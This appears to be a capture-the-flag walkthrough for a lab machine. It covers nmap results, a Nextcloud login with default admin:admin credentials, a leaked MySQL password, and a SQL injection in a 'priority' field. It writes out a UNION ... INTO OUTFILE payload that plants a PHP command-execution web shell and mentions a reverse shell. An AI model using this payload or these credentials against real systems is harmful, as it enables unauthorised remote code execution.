PORT      STATE  SERVICE
22/tcp    open   ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
17445/tcp open   unknown
30455/tcp open   unknown
50080/tcp open   unknown

port 30455
<img width="1915" height="882" alt="image" src="https://github.com/user-attachments/assets/3c43bb38-fba4-45c1-87cc-ade49996e1e7" />

in the sourcecode. i dont think u can do anything with js injection though
<img width="449" height="66" alt="image" src="https://github.com/user-attachments/assets/6db39c2e-5415-446f-9752-b60225e178f8" />
<img width="1111" height="397" alt="image" src="https://github.com/user-attachments/assets/9244be9a-d4b8-48db-90eb-d7df27f3f7c9" />

phpinfo document root /srv/http
<img width="529" height="60" alt="image" src="https://github.com/user-attachments/assets/24ebb6c1-1e57-4f61-8dea-fac9677e3195" />


port 17445
<img width="1368" height="443" alt="image" src="https://github.com/user-attachments/assets/c6126c0e-333d-4d2e-900c-d7e4c4d19b49" />
registered an account and logged in. got the username clinton and dummy
<img width="1229" height="289" alt="image" src="https://github.com/user-attachments/assets/09b22483-d6f2-4359-a685-ac53151ae85e" />

port 50080
index is a pizza page
<img width="1587" height="684" alt="image" src="https://github.com/user-attachments/assets/a163c36a-64b3-480e-bf88-48331e360175" />

but i found a login using nextcloud
<img width="1305" height="564" alt="image" src="https://github.com/user-attachments/assets/6aa267c7-b20f-47c6-9e60-f6ddd2c495e0" />
loggedin using admin:admin and downloaded issue tracker which is the port 17445 website
<img width="1781" height="590" alt="image" src="https://github.com/user-attachments/assets/5ffa6652-32fd-458a-a3b5-80714eec9cf0" />
found this folder with mysql. issue_user:ManagementInsideOld797
<img width="1523" height="148" alt="image" src="https://github.com/user-attachments/assets/85e30045-e0bb-4e15-be06-ab6399d8b380" />
<img width="599" height="81" alt="image" src="https://github.com/user-attachments/assets/de8f8bca-bb66-4a33-a687-76576fca27eb" />

nvm password was useless. i missed this. sql injection in the priority
<img width="1059" height="250" alt="image" src="https://github.com/user-attachments/assets/0e2a4900-a570-40c7-b5a2-ffab770c9063" />

use burp and change to POST
<img width="1255" height="413" alt="image" src="https://github.com/user-attachments/assets/eda8c1b9-553e-43d4-9ad5-c7fb6b4bc0d0" />

union sleep works
<img width="1261" height="515" alt="image" src="https://github.com/user-attachments/assets/57f7e24f-ae2d-4f0a-aa21-d41ee67d04f3" />

used this payload and url encoded into burp. uploaded into /srv/http which is the document root for port 30455
Normal' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/srv/http/cmd.php" -- 
<img width="933" height="255" alt="image" src="https://github.com/user-attachments/assets/a00d0a6d-c054-4af2-a85f-c01e07963cd9" />

had to url encode the bash rev shell payload
<img width="1019" height="56" alt="image" src="https://github.com/user-attachments/assets/705f97f4-55bb-42cc-9541-53a91ba34779" />
<img width="274" height="39" alt="image" src="https://github.com/user-attachments/assets/8b41e0cc-c0f9-436b-8df3-08bd49e9117b" />


